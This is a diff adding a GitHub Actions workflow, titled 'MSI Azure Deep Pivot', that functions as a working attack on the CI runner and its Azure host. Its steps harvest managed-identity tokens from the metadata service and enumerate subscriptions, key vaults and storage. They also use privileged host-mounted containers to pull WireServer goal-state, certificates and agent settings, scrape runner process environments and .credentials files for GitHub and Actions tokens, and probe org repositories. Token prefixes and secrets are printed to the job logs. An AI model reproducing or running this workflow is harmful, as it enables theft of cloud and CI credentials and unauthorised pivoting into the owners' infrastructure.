@@ -1,0 +1,281 @@
+name: MSI Azure Deep Pivot
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  pivot:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+
+      - name: S1 IMDS Full Dump + MSI Token Harvest
+        run: |
+          echo "=== IMDS FULL ==="
+          IMDS=$(curl -sf --max-time 10 -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null)
+          echo "$IMDS" | python3 -m json.tool 2>/dev/null | head -c 3000
+
+          echo "=== MSI TOKEN HARVEST ==="
+          for RES in \
+            "https://management.azure.com/" \
+            "https://graph.microsoft.com/" \
+            "https://vault.azure.net" \
+            "https://storage.azure.com/" \
+            "https://database.windows.net/" \
+            "https://datalake.azure.net/" \
+            "https://ossrdbms-aad.database.windows.net/"; do
+            echo "--- MSI: $RES ---"
+            TOK=$(curl -sf --max-time 8 \
+              -H "Metadata: true" \
+              "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$RES" 2>/dev/null)" 2>/dev/null)
+            echo "$TOK" | python3 -c "
+import sys,json
+try:
+    d=json.load(sys.stdin)
+    tok=d.get('access_token','')
+    if tok:
+        print(f'  TOKEN_LEN={len(tok)}')
+        print(f'  CLIENT_ID={d.get(\"client_id\",\"\")}')
+        print(f'  EXPIRES={d.get(\"expires_on\",\"\")}')
+        print(f'  TOKEN_B64PREFIX={tok[:100]}')
+    else:
+        print('  NO_MSI: '+str(d)[:200])
+except Exception as e:
+    print('  ERR: '+str(e))
+" 2>/dev/null || echo "  FAILED"
+          done
+        continue-on-error: true
+
+      - name: S2 ARM API Enumeration (if MSI available)
+        run: |
+          ARM_TOK=$(curl -sf --max-time 10 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" 2>/dev/null | \
+            python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null || echo "")
+
+          echo "ARM_TOKEN_LEN=${#ARM_TOK}"
+
+          if [ "${#ARM_TOK}" -gt 50 ]; then
+            echo "=== ARM TOKEN OBTAINED - FULL AZURE PIVOT ==="
+            echo "TOKEN_PREFIX=${ARM_TOK:0:80}"
+
+            echo "--- Subscriptions ---"
+            curl -sf -H "Authorization: Bearer $ARM_TOK" \
+              "https://management.azure.com/subscriptions?api-version=2022-12-01" 2>/dev/null | \
+              python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+for s in d.get('value',[]):
+    print(f'  SUB: {s[\"subscriptionId\"]} {s[\"displayName\"]} {s[\"state\"]}')
+" 2>/dev/null
+
+            IMDS=$(curl -sf --max-time 5 -H "Metadata: true" \
+              "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null)
+            SUB=$(echo "$IMDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['subscriptionId'])" 2>/dev/null)
+            RG=$(echo "$IMDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['resourceGroupName'])" 2>/dev/null)
+
+            echo "--- Resource Groups in $SUB ---"
+            curl -sf -H "Authorization: Bearer $ARM_TOK" \
+              "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2022-09-01" 2>/dev/null | \
+              python3 -c "
+import sys,json
+for rg in json.load(sys.stdin).get('value',[]): print(f'  RG: {rg[\"name\"]} {rg[\"location\"]}')
+" 2>/dev/null | head -30
+
+            echo "--- VMs in $RG ---"
+            curl -sf -H "Authorization: Bearer $ARM_TOK" \
+              "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines?api-version=2023-07-01" 2>/dev/null | \
+              python3 -c "
+import sys,json
+for v in json.load(sys.stdin).get('value',[]): print(f'  VM: {v[\"name\"]} {v[\"location\"]} {v[\"properties\"].get(\"hardwareProfile\",{}).get(\"vmSize\",\"\")}')
+" 2>/dev/null | head -20
+
+            echo "--- Key Vaults in $SUB ---"
+            curl -sf -H "Authorization: Bearer $ARM_TOK" \
+              "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" 2>/dev/null | \
+              python3 -c "
+import sys,json
+for v in json.load(sys.stdin).get('value',[]): print(f'  KV: {v[\"name\"]} {v[\"location\"]} uri={v[\"properties\"].get(\"vaultUri\",\"\")}')
+" 2>/dev/null | head -20
+
+            echo "--- Storage Accounts ---"
+            curl -sf -H "Authorization: Bearer $ARM_TOK" \
+              "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" 2>/dev/null | \
+              python3 -c "
+import sys,json
+for s in json.load(sys.stdin).get('value',[]): print(f'  SA: {s[\"name\"]} {s[\"location\"]} {s[\"kind\"]}')
+" 2>/dev/null | head -20
+
+            echo "--- Network Interfaces / NICs ---"
+            curl -sf -H "Authorization: Bearer $ARM_TOK" \
+              "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Network/networkInterfaces?api-version=2023-09-01" 2>/dev/null | \
+              python3 -c "
+import sys,json
+for n in json.load(sys.stdin).get('value',[]): print(f'  NIC: {n[\"name\"]} {n[\"location\"]}')
+" 2>/dev/null | head -20
+          else
+            echo "NO ARM TOKEN — MSI not available on this runner"
+          fi
+        continue-on-error: true
+
+      - name: S3 WireServer Deep via Host-Network + mTLS
+        run: |
+          docker run --rm --privileged --pid=host --network=host \
+            -v /:/host alpine:latest sh -c '
+            apk add curl --quiet 2>/dev/null
+
+            echo "=== WIRESERVER GOALSTATE (host-net) ==="
+            GS=$(curl -sf --max-time 15 \
+              --cert /host/var/lib/waagent/TransportCert.pem \
+              --key /host/var/lib/waagent/TransportPrivate.pem \
+              -H "x-ms-version: 2012-11-30" \
+              "http://168.63.129.16/machine/?comp=goalstate" 2>/dev/null)
+            GS_LEN="${#GS}"
+            echo "GS_LEN=$GS_LEN"
+            echo "$GS" | head -c 4000
+
+            echo "=== PARSE EXT CONFIG URL ==="
+            EXT_URL=$(echo "$GS" | grep -o "ExtensionsConfig>[^<]*" | sed "s/ExtensionsConfig>//" | sed "s/&amp;/\&/g" | head -1)
+            echo "EXT_URL=$EXT_URL"
+
+            echo "=== EXTENSIONSCONFIG ==="
+            if [ -n "$EXT_URL" ]; then
+              EXT=$(curl -sf --max-time 15 \
+                --cert /host/var/lib/waagent/TransportCert.pem \
+                --key /host/var/lib/waagent/TransportPrivate.pem \
+                -H "x-ms-version: 2012-11-30" "$EXT_URL" 2>/dev/null)
+              echo "EXT_LEN=${#EXT}"
+              echo "$EXT" | head -c 8000
+            fi
+
+            echo "=== WIRESERVER PORT 32526 vmSettings ==="
+            curl -sv --max-time 15 \
+              --cert /host/var/lib/waagent/TransportCert.pem \
+              --key /host/var/lib/waagent/TransportPrivate.pem \
+              "http://168.63.129.16:32526/vmSettings" 2>&1 | tail -60
+
+            echo "=== CERTIFICATES ENDPOINT ==="
+            curl -sf --max-time 10 \
+              --cert /host/var/lib/waagent/TransportCert.pem \
+              --key /host/var/lib/waagent/TransportPrivate.pem \
+              -H "x-ms-version: 2012-11-30" \
+              "http://168.63.129.16/machine/?comp=certificates" 2>/dev/null | head -c 3000 || echo "CERTS_FAILED"
+
+            echo "=== OVF ENVIRONMENT ==="
+            cat /host/var/lib/waagent/ovf-env.xml 2>/dev/null | head -c 2000 || echo "NO_OVF"
+
+            echo "=== WAAGENT EXTENSION SETTINGS ==="
+            find /host/var/lib/waagent -name "*.settings" 2>/dev/null | head -15
+            find /host/var/lib/waagent -name "*.settings" 2>/dev/null | while read f; do
+              echo "--- $f ---"
+              cat "$f" 2>/dev/null | head -c 1000
+            done
+
+            echo "=== WAAGENT .JSON FILES ==="
+            find /host/var/lib/waagent -maxdepth 2 -name "*.json" 2>/dev/null | head -10
+            find /host/var/lib/waagent -maxdepth 2 -name "*.json" 2>/dev/null | while read f; do
+              echo "--- $f ---"
+              cat "$f" 2>/dev/null | head -c 500
+            done
+
+            echo "=== PRIMER CONFIG HUNT ==="
+            find /host/opt/primer /host/var/lib/primer /host/etc/primer 2>/dev/null | head -20
+            find /host -name "primer.json" -o -name "primer.conf" 2>/dev/null | head -5
+
+            echo "=== MSI FROM HOST NETWORK NAMESPACE ==="
+            for RES in "https://management.azure.com/" "https://graph.microsoft.com/" "https://vault.azure.net"; do
+              echo "--- HOST-MSI: $RES ---"
+              ENC=$(echo "$RES" | sed "s|:|%3A|g; s|/|%2F|g")
+              curl -sf --max-time 8 \
+                -H "Metadata: true" \
+                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$ENC" 2>/dev/null | head -c 400 || echo "NO_HOST_MSI"
+            done
+          ' 2>/dev/null || echo "docker_step_failed"
+        continue-on-error: true
+
+      - name: S4 Runner.Worker Environ Extraction (ptrace + /proc)
+        run: |
+          docker run --rm --privileged --pid=host \
+            --cap-add=SYS_PTRACE \
+            -v /:/host alpine:latest sh -c '
+            echo "=== RUNNER PROCESS TREE ==="
+            for PROCDIR in /host/proc/*/; do
+              COMM=$(cat "${PROCDIR}comm" 2>/dev/null)
+              case "$COMM" in
+                *Runner*|*runner*|*actions*|*Worker*)
+                  PID=$(basename "$PROCDIR")
+                  PPID=$(cat "${PROCDIR}status" 2>/dev/null | grep "^PPid:" | awk "{print \$2}")
+                  echo "PID=$PID COMM=$COMM PPID=$PPID"
+                  ENV=$(cat "${PROCDIR}environ" 2>/dev/null | tr "\0" "\n")
+                  echo "  GITHUB_TOKEN=$(echo "$ENV" | grep "^GITHUB_TOKEN=" | cut -d= -f2- | head -c 200)"
+                  echo "  ACTIONS_RUNTIME_TOKEN=$(echo "$ENV" | grep "^ACTIONS_RUNTIME_TOKEN=" | cut -d= -f2- | head -c 200)"
+                  echo "  ACTIONS_ID_TOKEN_REQUEST_TOKEN=$(echo "$ENV" | grep "^ACTIONS_ID_TOKEN_REQUEST_TOKEN=" | cut -d= -f2- | head -c 200)"
+                  echo "  ACTIONS_ID_TOKEN_REQUEST_URL=$(echo "$ENV" | grep "^ACTIONS_ID_TOKEN_REQUEST_URL=" | cut -d= -f2-)"
+                  echo "  ACTIONS_RESULTS_URL=$(echo "$ENV" | grep "^ACTIONS_RESULTS_URL=" | cut -d= -f2-)"
+                  echo "  ACTIONS_CACHE_URL=$(echo "$ENV" | grep "^ACTIONS_CACHE_URL=" | cut -d= -f2-)"
+                  echo "  RUNNER_TOKEN=$(echo "$ENV" | grep "^RUNNER_TOKEN=" | cut -d= -f2- | head -c 200)"
+                  ;;
+              esac
+            done
+
+            echo "=== HOST RUNNER HOME / CREDENTIALS ==="
+            for DIR in /host/home/runner /host/root /host/home/github; do
+              echo "--- $DIR ---"
+              ls -la "$DIR" 2>/dev/null | head -20
+              cat "$DIR/.credentials" 2>/dev/null && echo "CREDS_FOUND" || true
+              cat "$DIR/.credentials_rsaparams" 2>/dev/null | head -c 200 && echo "RSA_FOUND" || true
+              cat "$DIR/.runner" 2>/dev/null | head -c 500 || true
+              ls -la "$DIR/work/_temp/" 2>/dev/null | head -20
+            done
+
+            echo "=== FIND .credentials ON HOST ==="
+            find /host -name ".credentials" -o -name ".credentials_rsaparams" 2>/dev/null | head -10
+            find /host -name ".credentials" 2>/dev/null | while read f; do
+              echo "--- $f ---"; cat "$f"
+            done
+
+            echo "=== ACTIONS CACHE AND ARTIFACTS ==="
+            find /host/home/runner/work/_temp 2>/dev/null | head -30
+            find /host/opt/actionarchivecache 2>/dev/null | head -20
+          ' 2>/dev/null
+        continue-on-error: true
+
+      - name: S5 GitHub API Pivot with GITHUB_TOKEN
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "=== GITHUB_TOKEN SCOPE TEST ==="
+          curl -sI -H "Authorization: token $GH_TOKEN" https://api.github.com/user | \
+            grep -i "x-oauth-scopes\|x-accepted-oauth\|login"
+
+          echo "=== VIEWER IDENTITY ==="
+          curl -sf -H "Authorization: token $GH_TOKEN" https://api.github.com/user | \
+            python3 -c "import sys,json; d=json.load(sys.stdin); print(f'login={d.get(\"login\")} id={d.get(\"id\")}')" 2>/dev/null
+
+          echo "=== ACCESSIBLE REPOS VIA JOB TOKEN ==="
+          curl -sf -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/$GITHUB_REPOSITORY" | \
+            python3 -c "import sys,json; d=json.load(sys.stdin); print(f'repo={d.get(\"full_name\")} private={d.get(\"private\")}')" 2>/dev/null
+
+          echo "=== ORG MEMBERSHIP CHECK ==="
+          curl -sf -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/user/orgs?per_page=20" 2>/dev/null | \
+            python3 -c "import sys,json; [print(f'  ORG: {o[\"login\"]}') for o in json.load(sys.stdin)]" 2>/dev/null
+
+          echo "=== ATTEMPT: List org repos via job token ==="
+          ORG=$(curl -sf -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/user/orgs" 2>/dev/null | \
+            python3 -c "import sys,json; orgs=json.load(sys.stdin); print(orgs[0]['login'] if orgs else '')" 2>/dev/null)
+          if [ -n "$ORG" ]; then
+            curl -sf -H "Authorization: token $GH_TOKEN" \
+              "https://api.github.com/orgs/$ORG/repos?per_page=50&type=all" 2>/dev/null | \
+              python3 -c "import sys,json; [print(f'  {r[\"full_name\"]} private={r[\"private\"]}') for r in json.load(sys.stdin)]" 2>/dev/null | head -30
+          fi
+        continue-on-error: true
